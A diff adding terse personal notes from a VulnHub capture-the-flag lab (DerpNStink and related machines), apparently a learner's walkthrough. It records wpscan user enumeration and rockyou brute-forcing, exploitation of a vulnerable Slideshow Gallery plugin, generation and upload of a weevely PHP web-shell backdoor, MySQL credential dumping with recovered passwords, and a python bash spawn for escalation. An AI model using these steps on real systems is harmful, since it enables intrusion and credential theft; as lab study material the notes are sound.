@@ -1,0 +1,32 @@
+https://www.vulnhub.com/series/derpnstink,147/
+
+┌──(root💀kali)-[~]
+└─# wpscan --url http://symfonos.localdomain/h3l105/ --enumerate u
+    admin
+┌──(root💀kali)-[~]
+└─# wpscan --url http://pumpkins.local -U user.txt -P /root/Downloads/rockyou.txt
+    admin
+
+┌──(root💀kali)-[~]
+└─# wpscan --url http://derpnstink.local/weblog --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
+    Slideshow Gallery 1.4.6(vulnerable)
+    CVE- 2014-5460
+
+https://www.youtube.com/watch?v=FuVr9YaUrbE
+┌──(root💀kali)-[~]
+└─# weevely generate whitexploit backdoor.php
+Generated 'backdoor.php' with password 'whitexploit' of 707 byte size.
+                                                                                                                                                                                                       
+┌──(root💀kali)-[~]
+└─# weevely http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/backdoor.php whitexploit
+
+
+mysql -uroot -pmysql
+use wordpress;select from * from wp-users;
+    stinky:wedgie57
+
+cp /home/stinky/Documents/derpissues.pcap /home/stinky/ftp/files/derpissues.pcap
+    не пологайся только на следование объектов, можно упустить, так пароль был только в тексте, не отображался в следование
+    mderp:derpderpderpderpderpderpderp
+
+python -c 'import os;os.system("/bin/bash")' > /home/mrderp/binaries.derpy*
